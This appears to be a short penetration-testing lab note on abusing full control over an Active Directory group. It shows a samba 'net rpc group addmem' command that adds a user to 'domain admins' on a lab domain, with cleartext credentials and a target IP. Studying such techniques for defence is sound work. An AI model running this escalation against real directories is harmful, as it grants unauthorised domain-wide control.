Full control of a group allows you to directly modify group membership of the group.

Use samba's net tool to add the user to the target group. The credentials can be supplied in cleartext or prompted interactively if omitted from the command line:

![[Pasted image 20250205203228.png]]

```bash
net rpc group addmem "domain admins" "CT059" -U "INLANEFREIGHT.LOCAL"/"CT059"%"charlie1" -S 172.16.7.3
```